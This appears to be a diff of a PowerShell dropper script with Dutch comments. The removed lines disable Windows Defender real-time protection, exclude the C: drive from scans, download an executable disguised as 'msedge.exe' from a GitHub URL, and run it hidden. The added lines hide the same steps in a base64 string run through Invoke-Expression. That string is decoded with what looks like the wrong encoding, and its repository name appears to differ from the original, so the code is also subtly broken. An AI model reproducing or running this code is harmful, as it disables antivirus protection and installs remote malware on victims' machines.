@@ -1,11 +1,3 @@
-# Schakel real-time protection van Windows Defender uit
-Set-MpPreference -DisableRealtimeMonitoring $true
-
-# Sluit de C:-schijf uit van Windows Defender-scans
-Add-MpPreference -ExclusionPath "C:\"
-
-# Download het bestand "msedge.exe" naar de tijdelijke map
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Nxtccijo/oooow/refs/heads/main/msedge.exe" -OutFile "$env:TEMP\msedge.exe"
-
-# Voer het gedownloade bestand uit
-Start-Process -FilePath "$env:TEMP\msedge.exe" -WindowStyle Hidden -Wait
+$encodedCommand = "U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQpBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNpb25QYXRoICdDOlwnCkludm9rZS1XZWJSZXF1ZXN0IC1VcmkgJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9OeHRjY2lvby9vb293L3JlZnMvaGVhZHMvbWFpbi9tc2VkZ2UuZXhlJyAtT3V0RmlsZSAnJGVudjpURU1QXG1zZWRnZS5leGUnClN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICckZW52OlRFTVBcbXNlZGdlLmV4ZScgLVdpbmRvd1N0eWxlIEhpZGRlbiAtV2FpdA=="
+$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedCommand))
+Invoke-Expression $decodedCommand
